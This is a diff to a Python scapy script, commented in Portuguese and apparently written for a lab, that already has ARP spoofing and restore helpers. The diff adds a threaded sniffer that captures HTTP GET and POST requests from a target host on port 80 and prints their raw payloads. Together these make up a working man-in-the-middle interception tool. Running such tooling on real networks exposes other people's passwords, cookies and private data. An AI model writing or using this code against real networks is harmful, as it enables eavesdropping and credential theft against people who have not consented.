@@ -4,6 +4,7 @@
 from scapy.all import *
 import time
 import sys
+import threading
 
 def get_mac(ip):
     """Obtém MAC de um IP"""
@@ -21,6 +22,22 @@ def restore(target_ip, target_mac, source_ip, source_mac):
     """Restaura tabela ARP"""
     packet = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=source_ip, hwsrc=source_mac)
     send(packet, count=4, verbose=False)
+
+def packet_callback(packet):
+    """Callback chamada para cada pacote capturado"""
+    if packet.haslayer(Raw) and packet.haslayer(IP):
+        payload = packet[Raw].load.decode('utf-8', errors='ignore')
+        if "GET" in payload or "POST" in payload:
+            print("\n" + "=" * 60)
+            print("[!] REQUISIÇÃO HTTP CAPTURADA!")
+            print("=" * 60)
+            print(payload[:500])  # Mostra os primeiros 500 caracteres
+            print("=" * 60 + "\n")
+
+def start_sniffer():
+    """Inicia o sniffer em uma thread separada"""
+    print("[*] Iniciando sniffer HTTP (porta 80)...")
+    sniff(filter="host 10.10.0.101 and port 80", prn=packet_callback, store=False)
 
 if __name__ == "__main__":
     # IPs no laboratório
